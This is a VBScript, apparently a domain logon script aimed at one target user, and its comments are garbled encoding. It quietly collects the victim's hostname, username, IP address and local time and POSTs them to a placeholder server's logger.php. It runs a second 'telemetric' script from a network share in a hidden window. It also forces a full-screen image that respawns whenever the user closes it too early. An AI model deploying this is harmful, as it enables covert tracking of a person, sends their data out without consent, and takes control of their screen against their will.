'uuid0AttractTargetAttention
'���� ������, ��� ���� ������� �� �������� ��� - �� ������ ���� ����������� � ������ ������
On error resume next
'��������� �� 1 ���� ������ ���� ���� �� ����� �������
runIsPermitted = 1
' ��������� �� 1 ���� ��������� ������ ������� ����������
telemericIsPermitted = 1
minMsgTime=8 '�����, �� ��������� �������� ������ ����� ����� ��������� �������
maxtime=8 '�����, �� ��������� �������� ������ ���� ���������

' "����������" - ���� ���� � ������, � ������� ��������� ���� �������
hostname = CreateObject("WScript.Shell").ExpandEnvironmentStrings( "%COMPUTERNAME%" )
username = CreateObject("WScript.Shell").ExpandEnvironmentStrings( "%USERNAME%" )
Dim ipaddr : ipaddr = ""
Dim objWMIService : Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Dim colAdapters : Set colAdapters = objWMIService.ExecQuery("Select IPAddress from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
Dim objAdapter
For Each objAdapter in colAdapters
  If Not IsNull(objAdapter.IPAddress) Then ipaddr = trim(objAdapter.IPAddress(0))
  exit for
Next


'��������� ���������� � �������� ��������
If GetObject("winmgmts:\\.\root\cimv2").Get("Win32_PingStatus.Address='"& "<webserv>" & "'").StatusCode = 0 Then 
   srvIsWork=1
Else
   srvIsWork=0
End If

'��������, ��� �������������� ������

If username = "<target username here>" Then
lanuch_type="TARGET"
Else

IF username = "<your username, for testing>" Then
lanuch_type="TESTING"
'����. ��������� ��� ����� ��� ���� �������
runIsPermitted=0 '��������� ��� ��� ����� ��������� �� �����
telemericIsPermitted=0
srvIsWork=0
Else
launch_type="GENERIC (username="&username&")"
End If
End If

'���������������� ������ � ������ ������ �������
srvinform ">>>>>>>>> Script runtime begin. <<<<<<<<<"

'�������� �� ������ ���������� � ������, �� ������� ������� ������
srvinform "Remote machine hostname: " & hostname
srvinform "Remote machine session username: " & username
srvinform "Remote machine local IP address: " & ipaddr
srvinform "Remote machine local time: " & DateInfo & Now

'���� ������� ��� ���� �������, �� ������������� ���� � ��� ��� ������ ��������
IF lanuch_type = "TESTING" Then
srvinform "Warning: This is a TESTING script launch, NOT by target caused.."
End If

'���� ������� ��� ������� "��������" ���������, �� �������� ���� "������ �������! ��� �� �������� ����!"
If lanuch_type = "TARGET" Then
srvinform "Warning: THIS SCRIPT RUNTIME CAUSED BY TARGET LOG-ON!"
End If

If telemericIsPermitted = 1 Then
srvinform "Launching telemetric daemon.."
set ws = wscript.createobject("WScript.shell")
ws.run("\\<AD DC ip>\<network share name here>\telemetric.vbs"), 0, false
Else
srvinform "Telemetric daemon launch is not permitted by script config."
End If

If runIsPermitted = 1 Then

srvinform "Showing greeting window.."

set objFso=createObject("scripting.fileSystemObject")
set objWShell=wScript.createObject("WScript.Shell")
srcLocation="\\<AD DC ip>\<network share name here>\uuid0ata-postcard-pic.jpg"
destLocation=objWShell.expandEnvironmentStrings("%temp%")&"\pic.jpg"
objFso.copyFile srcLocation,destLocation,true

isClosedCorrectly=0
intTimeStartShowing = Timer
Set objExplorer = WScript.CreateObject("InternetExplorer.Application", "IE_")
run(objExplorer)
While isClosedCorrectly=0
	If (Timer - intTimeStartShowing) > maxtime Then
	srvinform "Window closed by predefined show timeout."
	isClosedCorrectly=1
	objExplorer.Quit
	End If
    WScript.Sleep 1000
Wend
Function run(a)
With objExplorer
    .Navigate "about:blank"
    .Visible = 1
    .Silent = True
    .FullScreen = True
    .Document.Title = "..."
    .Toolbar=False
    .Statusbar=False
    .Height=640
    .Width=960
    .Document.Body.InnerHTML = "<center><img border=1 width=98% height=98% src='"&destLocation&"'></center>"
End With
End Function
Sub IE_onQuit()
	If (Timer - intTimeStartShowing) < minMsgTime Then
	srvinform "User attempted to close window before show timeout, respawning window.."
	Set objExplorer = WScript.CreateObject("InternetExplorer.Application", "IE_")
	run(objExplorer)
	Else
	isClosedCorrectly=1
	End If
End Sub
srvinform "Window closed. (Properly)"




'������� �������� HTTP POST ������� �� �������� ������
Function srvinform(msg)
  On Error Resume Next
  If srvIsWork=1 Then
  If GetObject("winmgmts:\\.\root\cimv2").Get("Win32_PingStatus.Address='"& "<webserv>" & "'").StatusCode = 0 Then 
    sUrl = "http://<webserv>/logger.php"
    sRequest = "data=" & msg
    set oHTTP = CreateObject("Microsoft.XMLHTTP")
    oHTTP.open "POST", sUrl,false
    oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    oHTTP.setRequestHeader "Content-Length", Len(sRequest)
    oHTTP.send sRequest
    HTTPPost = oHTTP.responseText
  End If
  End If
 End Function
Else
srvinform "Notice: uuid0ata script launched, but runIsPermitted=0 prevented msgs show!"
End If

'���������������� ������ � ���������� ������ �������
srvinform ">>>>>>>>>> Script runtime end. <<<<<<<<<<"